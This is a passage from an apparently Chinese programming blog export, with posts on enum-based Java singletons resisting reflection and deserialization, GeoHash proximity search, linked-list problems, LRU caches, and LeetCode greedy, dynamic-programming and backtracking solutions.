    <content type="text"><![CDATA[枚举实现单例模式，为什么可以防止反序列化和反射攻击。 为什么用枚举实现的单例模式可以防止反序列化和反射攻击用枚举实现单例模式： 123public enum Singleton&#123; INSTANCE;&#125; 写法极其简单，他的缺点是内存占用上是静态变量的两倍以上，如果程序不是大量采用枚举，那么这种性能的体现是很小的，基本不会受到影响，不用特别在意。 那么，他是如何防止反射攻击和反序列化的呢？ 对于反序列化问题： Java的序列化机制针对枚举类型是特殊处理的。简单来讲，在序列化枚举类型时，只会存储枚举类的引用和枚举常量的名称。随后的反序列化的过程中，这些信息被用来在运行时环境中查找存在的枚举类型对象。 这样你就可以在同一个运行时环境中反序列化枚举常量，并且你会得到同一个实例对象。 对于防止反射攻击： 1234567891011121314151617public enum Singleton &#123; INSTANCE &#123; @Override protected void read() &#123; System.out.println("read"); &#125; @Override protected void write() &#123; System.out.println("write"); &#125; &#125;; protected abstract void read(); protected abstract void write();&#125; 以上是一个单例枚举的例子，而我们要获取该实例只需要Singleton.INSTANCE，并且此种方式可以保证该单例线程安全、防反射攻击、防止序列化生成新的实例。 反编译后的类： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public abstract class Singleton extends Enum&#123; private Singleton(String s, int i) &#123; super(s, i); &#125; protected abstract void read(); protected abstract void write(); public static Singleton[] values() &#123; Singleton asingleton[]; int i; Singleton asingleton1[]; System.arraycopy(asingleton = ENUM$VALUES, 0, asingleton1 = new Singleton[i = asingleton.length], 0, i); return asingleton1; &#125; public static Singleton valueOf(String s) &#123; return (Singleton)Enum.valueOf(singleton/Singleton, s); &#125; Singleton(String s, int i, Singleton singleton) &#123; this(s, i); &#125; public static final Singleton INSTANCE; private static final Singleton ENUM$VALUES[]; static &#123; INSTANCE = new Singleton("INSTANCE", 0) &#123; protected void read() &#123; System.out.println("read"); &#125; protected void write() &#123; System.out.println("write"); &#125; &#125;; ENUM$VALUES = (new Singleton[] &#123; INSTANCE &#125;); &#125;&#125; 类的修饰abstract，所以没法实例化，反射也无能为力。 关于线程安全的保证，其实是通过类加载机制来保证的，我们看看INSTANCE的实例化时机，是在static块中，JVM加载类的过程显然是线程安全的。 当单例类被多个类加载器加载，如何还能保持单例？用多个类加载器的父类来加载单例类。 单例类如何防止反射攻击？12345678910111213141516171819202122public class Singleton &#123; private static boolean flag = false; private Singleton()&#123; synchronized(Singleton.class)&#123; if(flag == false)&#123; flag = !flag; &#125; else &#123; throw new RuntimeException("单例模式被侵犯！"); &#125; &#125; &#125; private static class SingletonHolder &#123; private static final Singleton INSTANCE = new Singleton(); &#125; public static Singleton getInstance()&#123; return SingletonHolder.INSTANCE; &#125; &#125; 针对这个方案，我认为并不是刻意防止反射攻击的。因为很显然，我可以通过反射修改这个flag的值。 123456789101112131415161718192021public class Test &#123; public static void main(String[] args) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123; Singleton s1 = Singleton.getInstance(); System.out.println(s1); Class&lt;?&gt; classType = Singleton.class; Field f = classType.getDeclaredField("flag"); f.setAccessible(true); f.set(s1,false); Constructor&lt;?&gt; c = classType.getDeclaredConstructor(null); c.setAccessible(true); Singleton s2 = (Singleton) c.newInstance(); System.out.println(s2); System.out.println(s1 == s2); &#125;&#125; 结果： 123singleton.Singleton@1540e19dsingleton.Singleton@7f31245afalse 所以…要想防止反射攻击还是要靠枚举啊。。。]]></content>
      <tags>
        <tag>技术短文杂记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十六、地理位置附近查询的GEOHASH解决方案]]></title>
    <url>%2F2018%2F08%2F31%2F%E5%8D%81%E5%85%AD%E3%80%81%E5%9C%B0%E7%90%86%E4%BD%8D%E7%BD%AE%E9%99%84%E8%BF%91%E6%9F%A5%E8%AF%A2%E7%9A%84GEOHASH%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[地理位置附近查询的GEOHASH解决方案 1.需求场景现今互联网确实从方方面面影响我们的生活。现在我们可以足不出户就能买到我们心仪的衣服，找到附近的美食。当我们点开一个外卖的app就能看到自己附近的餐厅，那我们有没有想过这是怎么实现的呢？ 2.尝试解决 首先我们能想到的就是把所有餐厅的经纬度存下来 然后当用户选择附近餐厅时 我们先获取用户的经纬度，然后到数据库中查出所有的经纬度，依次计算它们和用户间的距离。 最后根据用户输入的距离范围过滤出合适的餐厅，并根据距离做一个升序排列。 这样貌似能查出附近的餐厅，但是餐厅的数量这么多，直接全查出来内存也要爆掉，即使分批处理计算量也十分大。这样用户等待的时间就会特别长。那有什么办法能减少我们的计算量呢？ 其实很简单，我们应该只计算用户关心的那一片数据，而不是计算所有的。例如用户在北京，那完全没必要计算海南，黑龙江，新疆，浙江等其它地区的数据。如果我们能快速定位到北京甚至某个区，那么我们的计算量将大大减少。我们发现这其实就是索引的功能，但是MySQL对这种二维的地理位置的索引支持并不友好（mongodb有直接的地理位置索引），它对一维的像字符串这样的支持很好。那如果我们的数据在MySQL中，有没有什么方法能将我们的二维坐标转换为一种可比较的字符串呢？这就是我们今天要介绍的geohash算法。 3.基本思想geohash简单来说就是将一个地理坐标转换为一个可比较的字符串的算法。不过生成的字符串表示的是一个矩形的范围，并不是一个点。 比如西二旗地铁附近这一片矩形区域就可以用wx4eyu82这个字符串表示，并且越靠前的编码表示额范围越大，比如中国绝大部分地区可以用w这个字母表示的矩形区域内。像wx4eyu82表示的区域一定在wx4e表示的区域范围内。利用这些特性我们就可以实现附近餐厅的功能了，比如我们希望查看西二旗地铁附近的餐厅就可以这样查询：select * from table where geohash like &#39;wx4eyu82%&#39;; 这样就可以利用索引，快速查询出相关餐厅的信息了。并且我们还可以用wx4eyu82为key，餐厅信息为value做缓存。 通过上面的介绍我们知道了GeoHash就是一种将经纬度转换成字符串的方法，并且使得在大部分情况下，字符串前缀匹配越多的距离越近. 4.GeoHash算法的步骤 首先我们将经度和纬度都单独转换为一个二进制编码 得到经度和纬度的二进制编码后，我们按照奇数位放纬度，偶数为放经度的规则（我们这里奇数偶数下标是从0开始）将它们合成一个二进制编码 最后我们需要将这个二进制编码转换为base32编码 举例 地球纬度区间是[-90,90]， 北海公园的纬度是39.928167，可以通过下面算法对纬度39.928167进行逼近编码: 区间[-90,90]进行二分为[-90,0),[0,90]，称为左右区间，可以确定39.928167属于右区间[0,90]，给标记为1； 接着将区间[0,90]进行二分为 [0,45),[45,90]，可以确定39.928167属于左区间 [0,45)，给标记为0； 递归上述过程39.928167总是属于某个区间[a,b]。随着每次迭代区间[a,b]总在缩小，并越来越逼近39.928167； 如果给定的纬度x（39.928167）属于左区间，则记录0，如果属于右区间则记录1，这样随着算法的进行会产生一个序列1011100，序列的长度跟给定的区间划分次数有关。 通过上述计算，纬度产生的编码为10111 00011，经度产生的编码为11010 01011。偶数位放经度，奇数位放纬度，把2串编码组合生成新串：11100 11101 00100 01111。 最后使用用0-9、b-z（去掉a, i, l, o）这32个字母进行base32编码，首先将11100 11101 00100 01111转成十进制，对应着28、29、4、15，十进制对应的编码就是wx4g。 5.缺陷-geohash的边界问题比如红色的点是我们的位置，绿色的两个点分别是附近的两个餐馆，但是在查询的时候会发现距离较远餐馆的GeoHash编码与我们一样（因为在同一个GeoHash区域块上），而较近餐馆的GeoHash编码与我们不一致。 目前比较通行的做法就是我们不仅获取当前我们所在的矩形区域，还获取周围8个矩形块中的点。那么怎样定位周围8个点呢？关键就是需要获取周围8个点的经纬度，那我们已经知道自己的经纬度，只需要用自己的经纬度减去最小划分单位的经纬度就行。因为我们知道经纬度的范围,有知道需要划分的次数，所以很容易就能计算出最小划分单位的经纬度。 6.几种实现geohash方案的对比6.1支持二维索引的存储数据库：mongodbmongoDB支持二维空间索引,使用空间索引,mongoDB支持一种特殊查询,如某地图网站上可以查找离你最近的咖啡厅,银行等信息。这个使用mongoDB的空间索引结合特殊的查询方法很容易实现。 API直接支持，很方便 支持按照距离排序，并支持分页。支持多条件筛选。 可满足实时性需求。 资源占用大，数据量达到百万级请流量在10w左右查询速度明显下降。 6.2升级Mysql至5.7，支持GeohashMySQL 5.7.5 增加了对GeoHash的支持，提供了一系列geohash的函数，但是其实Mysql并没有提供类似mogodb类型near这样的函数，仅仅提供了一些经纬度转hash、hash取经纬度的一些函数。 优点:函数直接调用，生成目标hash、根据hash获取经纬度。 缺点：不支持范围查询函数，需要自行处理周边8点的问题，需要补充geo的算法 6.3Redis Commands: Geography EditionGEO 特性在 Redis 3.2 版发布， 这个功能可以将用户给定的地理位置信息储存起来， 并对这些信息进行操作，GEO通过如下命令来完成GEO需求. 命令 描述 geoadd 添加一个或多个经纬度地理位置 georadius 获取指定范围内的对象，也可以增加参数withdistance直接算出距离，也可以增加参数descending/ascending 进行距离排序 georadiusbymember 通过指定的对象，获取其周边对象 geoencode 转换为geohash，52-bit，同时返回该区域最小角的geohash,最大角的geohash，及中心点 geodecode 同上逆操作 优点:效率高，API丰富 缺点：3.2版本是否稳定？ 面试的时候，问到geohash算法以及技术选型大概也能说一说了… 本文章借鉴很多优秀文章，七拼八凑而出。]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十一、链表问题的总结]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%8D%81%E4%B8%80%E3%80%81%E9%93%BE%E8%A1%A8%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[链表问题的总结。 下面是本文所要用到链表节点的定义： 1234struct Node&#123; int data; Node* next;&#125;; 1. 在O(1)时间删除链表节点【题目描述】：给定链表的头指针和一个节点指针，在O(1)时间删除该节点。[Google面试题] 【主要思想】：不考虑是头节点或者尾节点，已知了当前要删除了节点，那么可以轻易获得下一个节点，那么下面就是将下一个节点的值赋给当前节点，然后当前节点指向下下个节点，就ok了。 【代码实现】 1234if (nodeToBeDeleted.next != null) &#123; nodeToBeDeleted.val = nodeToBeDeleted.next.val; nodeToBeDeleted.next = nodeToBeDeleted.next.next;&#125; 2. 单链表的转置【题目描述】：输入一个单向链表，输出逆序反转后的链表 【主要思想】：链表的转置是一个很常见、很基础的数据结构题了，非递归的算法很简单，用三个临时指针 pre、head、next 在链表上循环一遍即可。 【代码实现】： 123456789101112131415161718public class Solution &#123; public ListNode ReverseList(ListNode head) &#123; if(head == null)&#123; return null; &#125; ListNode pre = null; ListNode next = null; while(head != null)&#123; next = head.next; head.next = pre; pre = head; head = next; &#125; return pre; &#125;&#125; 3. 求链表倒数第k个节点【题目描述】：输入一个单向链表，输出该链表中倒数第k个节点，链表的倒数第0个节点为链表的尾指针。 【主要思想】：设置两个指针 p1、p2，首先 p1 和 p2 都指向 head，然后 p2 向前走 k 步，这样 p1 和 p2 之间就间隔 k 个节点，最后 p1 和 p2 同时向前移动，直至 p2 走到链表末尾。 【代码实现】：略 4. 求链表的中间节点【题目描述】：求链表的中间节点，如果链表的长度为偶数，返回中间两个节点的任意一个，若为奇数，则返回中间节点。 【主要思想】：最高效的解法和第3题一样，通过两个指针来完成。用两个指针从链表头节点开始，一个指针每次向后移动两步，一个每次移动一步，直到快指针移到到尾节点，那么慢指针即是所求。 【代码实现】：略 5. 判断单链表是否存在环【题目描述】：输入一个单向链表，判断链表是否有环？ 【主要思想】：通过两个指针，分别从链表的头节点出发，一个每次向后移动一步，另一个移动两步，两个指针移动速度不一样，如果存在环，那么两个指针一定会在环里相遇。 【代码实现】：略 6. 找到环的入口点【题目描述】：输入一个单向链表，判断链表是否有环。如果链表存在环，如何找到环的入口点？ 【主要思想】： 由上题可知，按照 p2 每次两步，p1 每次一步的方式走，发现 p2 和 p1 重合，确定了单向链表有环路了。接下来，让p2回到链表的头部，重新走，每次步长不是走2了，而是走1，那么当 p1 和 p2 再次相遇的时候，就是环路的入口了。 【代码实现】：略 7. 编程判断两个链表是否相交【题目描述】：给出两个单向链表的头指针（如下图所示） 【主要思想】： 解法一：直接循环判断第一个链表的每个节点是否在第二个链表中。但，这种方法的时间复杂度为O(Length(h1) * Length(h2))。显然，我们得找到一种更为有效的方法，至少不能是O（N^2）的复杂度。 解法二：针对第一个链表直接构造hash表，然后查询hash表，判断第二个链表的每个节点是否在hash表出现，如果所有的第二个链表的节点都能在hash表中找到，即说明第二个链表与第一个链表有相同的节点。时间复杂度为为线性：O(Length(h1) + Length(h2))，同时为了存储第一个链表的所有节点，空间复杂度为O(Length(h1))。是否还有更好的方法呢，既能够以线性时间复杂度解决问题，又能减少存储空间？ 解法三：进一步考虑“如果两个没有环的链表相交于某一节点，那么在这个节点之后的所有节点都是两个链表共有的”这个特点，我们可以知道，如果它们相交，则最后一个节点一定是共有的。而我们很容易能得到链表的最后一个节点，所以这成了我们简化解法的一个主要突破口。那么，我们只要判断两个链表的尾指针是否相等。相等，则链表相交；否则，链表不相交。所以，先遍历第一个链表，记住最后一个节点。然后遍历第二个链表，到最后一个节点时和第一个链表的最后一个节点做比较，如果相同，则相交，否则，不相交。这样我们就得到了一个时间复杂度，它为O((Length(h1) + Length(h2))，而且只用了一个额外的指针来存储最后一个节点。这个方法时间复杂度为线性O(N)，空间复杂度为O(1)，显然比解法三更胜一筹。 【代码实现】： 123456789101112131415//判断两个链表是否相交bool isIntersect(Node *h1,Node *h2)&#123; if(h1 == NULL || h2 == NULL) return false; //异常判断 while(h1-&gt;next != NULL) &#123; h1 = h1-&gt;next; &#125; while(h2-&gt;next != NULL) &#123; h2 = h2-&gt;next; &#125; if(h1 == h2) return true; //尾节点是否相同 else return false;&#125; 8. 扩展：链表有环，如何判断相交【题目描述】：上面的问题都是针对链表无环的，那么如果现在，链表是有环的呢?上面的方法还同样有效么? 【主要思想】： 如果有环且两个链表相交，则两个链表都有共同一个环，即环上的任意一个节点都存在于两个链表上。因此，就可以判断一链表上俩指针相遇的那个节点，在不在另一条链表上。 【代码实现】： 1234567891011121314151617//判断两个带环链表是否相交bool isIntersectWithLoop(Node *h1,Node *h2)&#123; Node *circleNode1,*circleNode2; if(!hasCircle(h1,circleNode1)) //判断链表带不带环，并保存环内节点 return false; //不带环，异常退出 if(!hasCircle(h2,circleNode2)) return false; Node *temp = circleNode2-&gt;next; while(temp != circleNode2) &#123; if(temp == circleNode1) return true; temp = temp-&gt;next; &#125; return false;&#125; 9. 扩展：两链表相交的第一个公共节点【题目描述】：如果两个无环单链表相交，怎么求出他们相交的第一个节点呢？ 【主要思想】：采用对齐的思想。计算两个链表的长度 L1 , L2，分别用两个指针 p1 , p2 指向两个链表的头，然后将较长链表的 p1（假设为 p1）向后移动L2 - L1个节点，然后再同时向后移动p1 , p2，直到 p1 = p2。相遇的点就是相交的第一个节点。 【代码实现】： 12345678910111213141516171819202122232425//求两链表相交的第一个公共节点Node* findIntersectNode(Node *h1,Node *h2)&#123; int len1 = listLength(h1); //求链表长度 int len2 = listLength(h2); //对齐两个链表 if(len1 &gt; len2) &#123; for(int i=0;i&lt;len1-len2;i++) h1=h1-&gt;next; &#125; else &#123; for(int i=0;i&lt;len2-len1;i++) h2=h2-&gt;next; &#125; while(h1 != NULL) &#123; if(h1 == h2) return h1; h1 = h1-&gt;next; h2 = h2-&gt;next; &#125; return NULL;&#125; 原文： http://wuchong.me/blog/2014/03/25/interview-link-questions/]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十、LRU算法实现]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%8D%81%E3%80%81LRU%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[LRU算法实现。 定义LRU（Least recently used，最近最少使用）算法根据数据的历史访问记录来进行淘汰数据，其核心思想是“如果数据最近被访问过，那么将来被访问的几率也更高”。 LinkedHashMap实现LinkedHashMap自身已经实现了顺序存储，默认情况下是按照元素的添加顺序存储，也可以启用按照访问顺序存储，即最近读取的数据放在最前面，最早读取的数据放在最后面，然后它还有一个判断是否删除最老数据的方法，默认是返回false，即不删除数据. 123456789101112//LinkedHashMap的一个构造函数，当参数accessOrder为true时//会按照访问顺序排序，最近访问的放在最前，最早访问的放在后面public LinkedHashMap(int initialCapacity,float loadFactor,boolean accessOrder) &#123; super(initialCapacity, loadFactor); this.accessOrder = accessOrder;&#125;//LinkedHashMap 默认返回false 则不删除节点。 返回true 代表要删除最早的节点。//通常构建一个LruCache会在达到Cache的上限是返回trueprotected boolean removeEldestEntry(Map.Entry&lt;K,V&gt; eldest) &#123; return false;&#125; 具体实现：123456789101112131415161718192021222324252627282930313233343536373839public class LRUCache&lt;K,V&gt; extends LinkedHashMap&lt;K,V&gt;&#123; private int cacheSize; //缓存值大小 public LRUCache(int cacheSize) &#123; super(16, 0.75f, true); //true设置按照访问顺序排序 this.cacheSize = cacheSize; &#125; //如果LinkedHashMap的大小超过缓存值，返回true删除最早的数据 protected boolean removeEldestEntry(Map.Entry&lt;K, V&gt; eldest) &#123; return size() &gt;= cacheSize; &#125; public static void main(String[] args) &#123; LRUCache&lt;String, String&gt; cache = new LRUCache&lt;&gt;(5); cache.put("1", "1"); cache.put("2", "2"); cache.put("3", "3"); cache.put("4", "4"); cache.put("5", "5"); System.out.println("初始："); cache.keySet().forEach(System.out::println);//2 3 4 5 System.out.println("访问2："); cache.get("2"); cache.keySet().forEach(System.out::println);//3 4 5 2 System.out.println("访问2、3："); cache.get("2"); cache.get("3"); cache.keySet().forEach(System.out::println);//4 5 2 3 System.out.println("增加数据6、7："); cache.put("6", "6"); cache.put("7", "7"); cache.keySet().forEach(System.out::println);//2 3 6 7 &#125;&#125; HashMap原生实现将Cache的所有位置都用双链表连接起来，当一个位置被命中之后，就将通过调整链表的指向，将该位置调整到链表头的位置，新加入的Cache直接加到链表头中。 这样，在多次进行Cache操作后，最近被命中的，就会被向链表头方向移动，而没有命中的，而想链表后面移动，链表尾则表示最近最少使用的Cache。 当需要替换内容时候，链表的最后位置就是最少被命中的位置，我们只需要淘汰链表最后的部分即可。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798public class LRUCache1&lt;K,V&gt; &#123; //定义一个节点数据结构 class Entry&lt;K, V&gt; &#123; Entry pre; Entry next; K key; V value; &#125; //最大缓存数量 private final int MAX_CACHE_SIZE; //头指针 private Entry first; //尾指针 private Entry last; private HashMap&lt;K, Entry&lt;K, V&gt;&gt; hashMap; private LRUCache1(int cacheSize) &#123; MAX_CACHE_SIZE = cacheSize; hashMap = new HashMap&lt;K, Entry&lt;K, V&gt;&gt;(); &#125; public void put(K key, V value) &#123; Entry entry = getEntry(key); if (entry == null) &#123; if (hashMap.size() &gt;= MAX_CACHE_SIZE) &#123; hashMap.remove(last.key); removeLast(); &#125; entry = new Entry(); entry.key = key; &#125; entry.value = value; moveToFirst(entry); hashMap.put(key, entry); &#125; public V get(K key) &#123; Entry&lt;K, V&gt; entry = getEntry(key); if (entry == null) return null; moveToFirst(entry); return entry.value; &#125; //根据key获取节点 private Entry&lt;K, V&gt; getEntry(K key) &#123; return hashMap.get(key); &#125; private void moveToFirst(Entry entry) &#123; if (entry == first) return; if (entry.pre != null) entry.pre.next = entry.next; if (entry.next != null) entry.next.pre = entry.pre; if (entry == last) last = last.pre; if (first == null || last == null) &#123; first = last = entry; return; &#125; entry.next = first; first.pre = entry; first = entry; entry.pre = null; &#125; private void removeLast() &#123; if (last != null) &#123; last = last.pre; if (last == null) first = null; else last.next = null; &#125; &#125; public static void main(String[] args) &#123; LRUCache1&lt;String, String&gt; cache = new LRUCache1&lt;&gt;(5); cache.put("1", "1"); cache.put("2", "2"); cache.put("3", "3"); cache.put("4", "4"); cache.put("5", "5"); System.out.println("初始："); cache.hashMap.keySet().forEach(System.out::println); System.out.println("访问2："); cache.get("2"); cache.hashMap.keySet().forEach(System.out::println); System.out.println("访问2、3："); cache.get("2"); cache.get("3"); cache.hashMap.keySet().forEach(System.out::println); System.out.println("增加数据6、7："); cache.put("6", "6"); cache.put("7", "7"); cache.hashMap.keySet().forEach(System.out::println); &#125;&#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[九、贪心算法]]></title>
    <url>%2F2018%2F08%2F16%2F%E4%B9%9D%E3%80%81%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[贪心算法。 455. Assign Cookies题目描述假设你想给小朋友们饼干，每个小朋友最多能够给一块饼干，每个 小朋友都有一个“贪心指数”，称为g(i),g(i)表示这名小朋友需要的饼干大小的最小值。同时，每个饼干都有一个大小值s(i)，如果s(i)&gt;=g(i)，我们将饼干j分给小朋友i后，小朋友就会很开心。给定数组s和g，问如何分配饼干，能让更多的小朋友开心。 Input: [1,2,3], [1,1] Output: 1 有三个小朋友和两块饼干，小朋友想要的饼干数分别是1,2,3，但是你的两块饼干分别只有1和 1，所以只能满足一个小朋友，故最后输出1 解题思路尝试将最大的饼干给最贪心的小朋友 代码实现12345678910111213141516171819202122class Solution &#123; public int findContentChildren(int[] g, int[] s) &#123; //从小到大排序 Arrays.sort(g); Arrays.sort(s); //初始值分别指向最大值 int gi = g.length-1,si = s.length-1,cnt = 0; while(gi&gt;=0 &amp;&amp; si&gt;=0)&#123; //如果最大的饼干可以满足最贪婪的小朋友 if(g[gi] &lt;= s[si])&#123; gi--; si--; cnt++; //最大的饼干无法满足最贪婪的小朋友，那么就找次贪婪的小朋友 &#125;else&#123; gi--; &#125; &#125; return cnt; &#125;&#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八、动态规划问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%85%AB%E3%80%81%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[动态规划问题。 什么是动态规划将原问题拆解为若干子问题，同时保存子问题的答案，使得每个子问题只求解一次，最终获得原问题的答案。 递归问题-&gt;重叠子问题 -----记忆化搜索(自顶向下) \ -----动态规划(自底向上) 70. Climbing Stairs题目描述跳台阶，一次可以跳两格或者一格，请问n个台阶有多少种跳法。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869class Solution &#123; HashMap&lt;Integer,Integer&gt; map = new LinkedHashMap&lt;&gt;(); public int climbStairs(int n) &#123; /*********第一种方法，超时，因为有大量重复的计算****** if(n &lt;= 0) return 0; if(n == 1) return 1; if(n == 2) return 2; return climbStairs(n-1)+climbStairs(n-2); ****************************************************/ /*********第二种方法，用两个变量来存储前面的两个数****** if(n &lt;= 0) return 0; int i1=1,i2=2,i3=0; if(n == 1) return 1; if(n == 2) return 2; for(int i=3;i&lt;=n;i++)&#123; i3 = i1+i2; i1 = i2; i2 = i3; &#125; return i3; ******************************************************/ /*********第三种方式，用一个n+1的数组来存储****** if(n &lt;= 0) return 0; if(n == 1) return 1; if(n == 2) return 2; int[] arr = new int[n+1]; arr[0] = 0; arr[1] = 1; arr[2] = 2; for(int i=3;i&lt;=n;i++)&#123; arr[i] = arr[i-1]+arr[i-2]; &#125; return arr[n]; ******************************************************/ /************以上的方法，思路都是从自底向上************/ /*********第四种方式，自顶向下，用记忆化搜索来实现******/ //现在最外面定义一个Map来存储n和对应的计算结果 if(n &lt;= 0) return 0; if(n == 1) return 1; if(n == 2) return 2; //递归的过程中，会记忆一下某些值，不再重复计算了 if(map.containsKey(n))&#123; return map.get(n); &#125; map.put(n,climbStairs(n-1)+climbStairs(n-2)); return map.get(n); &#125;&#125; 343. Integer Break题目描述给定一个正数，可以将其分割为多个数字的和，若要让这些数字的乘积最大，求分割的方法，至少要分割为两个数，算法返回这个最大的乘积。 given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4). 代码实现第一种方式—递归(超时，不通过)： 12345678910111213class Solution &#123; public int integerBreak(int n) &#123; if(n == 1) return 1; int res = -1; for(int i=1;i&lt;=n-1;i++)&#123; res = Math.max(res, Math.max(i*(n-i),i*integerBreak(n-i))); &#125; return res; &#125;&#125; 第二种方式—记忆搜索(通过)：1234567891011121314151617181920212223class Solution &#123; //记忆搜索法，自顶向下 HashMap&lt;Integer,Integer&gt; map = new LinkedHashMap&lt;&gt;(); public int integerBreak(int n) &#123; if(n == 1) return 1; //这里是用map来记忆一下算出来的值，在递归的过程中，遇到了就不需要重复计算了，提高性能 if(map.containsKey(n))&#123; return map.get(n); &#125; int res = -1; //从1开始遍历，在res,i*(n-i)--&gt;就是说一个数n只拆分一次即i和n-i来比较一下，还有就是对n-i再继续拆分 for(int i=1;i&lt;=n-1;i++)&#123; res = Math.max(res,Math.max(i*(n-i),i*integerBreak(n-i))); &#125; //将每次递归结束后的值存储一下 map.put(n,res); return res; &#125;&#125; 第三种方式—动态规划(通过)： 12345678910111213class Solution &#123; public int integerBreak(int n) &#123; int[] dp = new int[n+1]; dp[1] = 1; for(int i=2;i&lt;=n;i++)&#123; for(int j=1;j&lt;i;j++)&#123; dp[i] = Math.max(dp[i],Math.max(j*(i-j),j*dp[i-j])); &#125; &#125; return dp[n]; &#125;&#125; 198. House Robber题目描述小偷偷东西，不能连续偷两家，问怎么偷才能偷到最多？ Input: [1,2,3,1]Output: 4 Input: [2,7,9,3,1]Output: 12 代码实现12345678910111213141516171819202122232425class Solution &#123; public int rob(int[] nums) &#123; return tryRob(nums,0); &#125; //记忆搜索法 Map&lt;Integer,Integer&gt; map = new LinkedHashMap&lt;&gt;(); private int tryRob(int[] nums,int index)&#123; if(index &gt;= nums.length) return 0; if(map.containsKey(index))&#123; return map.get(index); &#125; int res = 0; for(int i=index;i&lt;nums.length;i++)&#123; res = Math.max(res,nums[i]+tryRob(nums,i+2)); &#125; map.put(index,res); return res; &#125;&#125; 对于状态的定义： 考虑偷取[x…n-1]范围里的房子。 123456789101112131415161718192021class Solution &#123; //DP solution public int rob(int[] nums) &#123; int n = nums.length; if(n == 0) return 0; //0...n-1 int[] memo = new int[nums.length]; //记录n-1处的值 memo[n-1] = nums[n-1]; //第一次循环先计算出n-2处的值 for(int i=n-2;i&gt;=0;i--)&#123; for(int j=i;j&lt;n;j++)&#123; memo[i] = Math.max(memo[i],nums[j]+(j+2&lt;n?memo[j+2]:0)); &#125; &#125; return memo[0]; &#125; &#125; 300. Longest Increasing Subsequence题目描述Given [10, 9, 2, 5, 3, 7, 101, 18], The longest increasing subsequence is [2, 3, 7, 101], therefore the length is 4. 注意这里是求最长的增长序列，而不是要求连续的。 代码实现123456789101112131415161718192021222324252627class Solution &#123; public int lengthOfLIS(int[] nums) &#123; if(nums.length &lt;= 1) return nums.length; //新建一个数组T，用来标识nums元素前面有多少个连续小于他的，从1开始加 //比如nums=[10,15,20,11,9,101] //15前面10比他小，所以为2,20前面有10和15都比他小，所以为3，最后101前面有10,15,20这三个比他小，所以为4 //那么T=[1,2,3,2,1,4] int[] T = new int[nums.length]; Arrays.fill(T,1); for(int i=1;i&lt;nums.length;i++)&#123; for(int j=0;j&lt;i;j++)&#123; if(nums[j] &lt; nums[i])&#123; T[i] = Math.max(T[i],1+T[j]); &#125; &#125; &#125; int res = 0; for(int i=0;i&lt;T.length;i++)&#123; res = Math.max(res,T[i]); &#125; return res; &#125;&#125;]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[七、回溯问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E4%B8%83%E3%80%81%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[回溯问题。 17. Letter Combinations of a Phone Number题目描述给出一个数字字符串，返回这个数字字符串所能表示的所有字母组合。 代码实现不用回溯法来做： 123456789101112131415161718192021222324252627282930313233class Solution &#123; public List&lt;String&gt; letterCombinations(String digits) &#123; //每个数字对应的字母串 String digitletter[] = &#123;"","","abc","def","ghi","jkl","mno","pqrs","tuv","wxyz"&#125;; //存放结果 List&lt;String&gt; result = new ArrayList&lt;&gt;(); if(digits.length() == 0) return result; //先添加一个""元素进去，用于第一次进去的字符的拼接 result.add(""); //遍历输入进来的数字，进行递归操作 for(int i=0;i&lt;digits.length();i++)&#123; //将输入进来的数字对应到数组的下标，从而取出数字对应的所有字符串 result = combine(digitletter[digits.charAt(i)-'0'],result); &#125; return result; &#125; private List&lt;String&gt; combine(String digit,List&lt;String&gt; list)&#123; List&lt;String&gt; result = new ArrayList&lt;&gt;(); //例如输入的数字为23，那么分别对应的字符串为"abc","def" //第一次循环，拿到数字2，那么对应的digit为"abc"，那么这里对字符串进行遍历，list中现在只有""，那么结果是["a","b","c"] //第二次循环进来，拿到的数字是2，那么对应的digit是"def"，这里外面的for循环第一次拿到"d"，进入里面的循环，遍历["a","b","c"]，分别拼接为 //["ad","bd","cd"]，下一次拼接完结果是["ad","bd","cd","bd","be","bf"]，最后一次是["ad","bd","cd","bd","be","bf","cd","ce","cf"] for(int i=0;i&lt;digit.length();i++)&#123; for(String str:list)&#123; result.add(str+digit.charAt(i)); &#125; &#125; return result; &#125;&#125; 用回溯法来做 12345678910111213141516171819202122232425262728293031class Solution &#123; //每个数字对应的字母串 String digitletter[] = &#123;"","","abc","def","ghi","jkl","mno","pqrs","tuv","wxyz"&#125;; //结果集 List&lt;String&gt; result = new ArrayList&lt;&gt;(); public List&lt;String&gt; letterCombinations(String digits) &#123; if(digits.length() == 0) return result; findCombine(digits,0,""); return result; &#125; private void findCombine(String digits,int index,String str)&#123; if(index == digits.length())&#123; result.add(str); return; &#125; //根据下标找到数字 char ch = digits.charAt(index); //根据数字找出对应的字符串 String letters = digitletter[ch-'0']; //遍历字符串，回溯递归，知道index等于数字串长度了停止 